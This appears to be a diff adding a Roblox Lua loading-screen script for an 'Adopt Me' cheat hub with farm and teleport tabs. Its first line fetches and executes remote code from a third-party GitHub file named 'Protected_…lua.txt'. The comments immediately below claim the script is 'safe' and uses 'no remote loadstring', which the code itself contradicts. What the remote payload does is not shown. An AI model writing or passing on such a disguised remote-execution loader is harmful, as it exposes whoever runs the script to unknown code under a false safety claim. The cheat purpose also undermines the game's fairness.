@@ -1,0 +1,159 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptNOKEY1/Adoptme/refs/heads/main/Protected_8947349984321917.lua.txt"))()
+
+-- Safe Local Loading Screen (no remote loadstring)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+
+-- UI setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreen"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = PlayerGui
+
+local background = Instance.new("Frame")
+background.Name = "Background"
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+background.BackgroundTransparency = 0.3
+background.Parent = screenGui
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Name = "LoadingText"
+loadingText.Size = UDim2.new(1, 0, 0.1, 0)
+loadingText.Position = UDim2.new(0, 0, 0.42, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading"
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextScaled = true
+loadingText.Parent = background
+
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Name = "PercentLabel"
+percentLabel.Size = UDim2.new(0.6, 0, 0.06, 0)
+percentLabel.Position = UDim2.new(0.2, 0, 0.52, 0)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Text = "0%"
+percentLabel.TextColor3 = Color3.fromRGB(255,255,255)
+percentLabel.Font = Enum.Font.Gotham
+percentLabel.TextScaled = true
+percentLabel.Parent = background
+
+local timeLeftLabel = Instance.new("TextLabel")
+timeLeftLabel.Name = "TimeLeftLabel"
+timeLeftLabel.Size = UDim2.new(0.6, 0, 0.05, 0)
+timeLeftLabel.Position = UDim2.new(0.2, 0, 0.58, 0)
+timeLeftLabel.BackgroundTransparency = 1
+timeLeftLabel.Text = "Time left: --s"
+timeLeftLabel.TextColor3 = Color3.fromRGB(200,200,200)
+timeLeftLabel.Font = Enum.Font.Gotham
+timeLeftLabel.TextScaled = true
+timeLeftLabel.Parent = background
+
+local progressBarBackground = Instance.new("Frame")
+progressBarBackground.Name = "ProgressBarBackground"
+progressBarBackground.Size = UDim2.new(0.6, 0, 0.05, 0)
+progressBarBackground.Position = UDim2.new(0.2, 0, 0.64, 0)
+progressBarBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+progressBarBackground.BorderSizePixel = 0
+progressBarBackground.Parent = background
+
+local progressBar = Instance.new("Frame")
+progressBar.Name = "ProgressBar"
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = progressBarBackground
+
+-- Config: make loading slower/faster here
+local totalSteps = 100
+local stepDelay = 0.15 -- seconds per percent; increase to slow longer
+local tweenTime = 0.12 -- progress bar tween time
+
+-- Animated dots for loading text
+local function animateLoadingText()
+    while screenGui.Parent do
+        for i = 1, 3 do
+            if not screenGui.Parent then break end
+            loadingText.Text = "Adopt Me Script Loading Please Wait" .. string.rep(".", i)
+            task.wait(0.5)
+        end
+    end
+end
+
+-- Main loading routine (updates percent and estimated time-left)
+local function startLoading()
+    task.spawn(animateLoadingText)
+
+    local startTime = tick()
+    for i = 1, totalSteps do
+        -- update bar
+        progressBar:TweenSize(
+            UDim2.new(i / totalSteps, 0, 1, 0),
+            Enum.EasingDirection.Out,
+            Enum.EasingStyle.Sine,
+            tweenTime,
+            true
+        )
+
+        -- update percent text
+        percentLabel.Text = tostring(i) .. "%"
+
+        -- estimate time left (simple linear estimate)
+        local elapsed = tick() - startTime
+        local avgPerStep = elapsed / i
+        local remaining = math.max(0, math.floor((totalSteps - i) * avgPerStep + 0.5))
+        timeLeftLabel.Text = "Time left: " .. tostring(remaining) .. "s"
+
+        task.wait(stepDelay)
+    end
+
+    -- small pause at 100%
+    task.wait(0.6)
+
+    -- animate out then destroy
+    -- shrink screenGui smoothly
+    screenGui:TweenSizeAndPosition(
+        UDim2.new(0, 0, 0, 0),
+        UDim2.new(0.5, 0, 0.5, 0),
+        Enum.EasingDirection.Out,
+        Enum.EasingStyle.Sine,
+        0.8,
+        true,
+        function()
+            if screenGui and screenGui.Parent then
+                screenGui:Destroy()
+            end
+
+            -- safely call your main menu initializer (no remote fetch)
+            -- If you have a local ModuleScript named "Library" in ReplicatedStorage:
+            local success, Library = pcall(function()
+                return require(ReplicatedStorage:WaitForChild("Library"))
+            end)
+
+            if success and Library and type(Library.CreateWindow) == "function" then
+                local Window = Library:CreateWindow('Satr - Hub')
+                local Tab = {
+                    Tab_1 = Window:addTab('•Home'),
+                    Tab_Setting = Window:addTab('•Settings'),
+                    Tab_2 = Window:addTab('•Main Farm'),
+                    Tab_5 = Window:addTab('•Teleport & Status'),
+                    Tab_6 = Window:addTab('•Shop'),
+                    Tab_7 = Window:addTab('•Misc')
+                }
+                Tab.Tab_1:addButton("Start Game", function()
+                    print("Game Started!")
+                end)
+            else
+                -- If Library not found or invalid, fallback or notify
+                warn("Library module not found in ReplicatedStorage or invalid. Place a local ModuleScript named 'Library' there.")
+            end
+        end
+    )
+end
+
+startLoading()
